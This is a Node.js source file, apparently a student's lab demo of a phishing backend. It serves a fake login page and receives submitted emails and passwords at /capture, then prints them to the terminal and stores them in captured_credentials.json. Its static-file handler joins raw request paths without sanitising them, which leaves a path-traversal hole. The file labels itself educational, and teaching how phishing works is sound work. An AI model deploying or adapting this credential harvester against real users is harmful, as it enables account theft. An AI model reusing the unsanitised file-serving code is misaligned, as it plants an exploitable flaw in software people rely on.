/*
 * ============================================================
 *  EDUCATIONAL PHISHING DEMO – Node.js Backend
 *  Student: Muhammad Ammar Qaisar (BITF24A052)
 *  Project: How Attackers Target Smartphones
 *
 *  ⚠️  FOR EDUCATIONAL / LAB USE ONLY.
 *      Never deploy against real users.
 * ============================================================
 *
 *  HOW TO RUN:
 *    1. Make sure Node.js is installed (v14+).
 *    2. cd into this directory.
 *    3. Run:  node server.js
 *    4. Open http://localhost:3000 in a browser.
 *    5. Enter test credentials – they will appear in the
 *       terminal AND in captured_credentials.json.
 */

const http = require('http');
const fs   = require('fs');
const path = require('path');

const PORT     = 3000;
const LOG_FILE = path.join(__dirname, 'captured_credentials.json');

// Initialise log file
if (!fs.existsSync(LOG_FILE)) {
    fs.writeFileSync(LOG_FILE, '[]', 'utf-8');
}

const MIME = {
    '.html': 'text/html',
    '.css' : 'text/css',
    '.js'  : 'application/javascript',
    '.json': 'application/json',
};

const server = http.createServer((req, res) => {

    // ── POST /capture  →  store fake credentials ──
    if (req.method === 'POST' && req.url === '/capture') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const entry = JSON.parse(body);
                const log   = JSON.parse(fs.readFileSync(LOG_FILE, 'utf-8'));
                log.push(entry);
                fs.writeFileSync(LOG_FILE, JSON.stringify(log, null, 2), 'utf-8');

                console.log('\n🚨 [CAPTURED] Credential entry:');
                console.log('   Email   :', entry.email);
                console.log('   Password:', entry.password);
                console.log('   Time    :', entry.timestamp);

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'logged' }));
            } catch (err) {
                res.writeHead(400);
                res.end('Bad request');
            }
        });
        return;
    }

    // ── Serve static files ──
    let filePath = req.url === '/' ? '/index.html' : req.url;
    filePath = path.join(__dirname, filePath);

    const ext  = path.extname(filePath);
    const mime = MIME[ext] || 'application/octet-stream';

    fs.readFile(filePath, (err, data) => {
        if (err) {
            res.writeHead(404);
            res.end('Not found');
            return;
        }
        res.writeHead(200, { 'Content-Type': mime });
        res.end(data);
    });
});

server.listen(PORT, () => {
    console.log('============================================================');
    console.log('  ⚠️  EDUCATIONAL PHISHING DEMO SERVER');
    console.log('  Student: Muhammad Ammar Qaisar (BITF24A052)');
    console.log('  Open: http://localhost:' + PORT);
    console.log('  Credentials will be logged to:', LOG_FILE);
    console.log('============================================================');
});
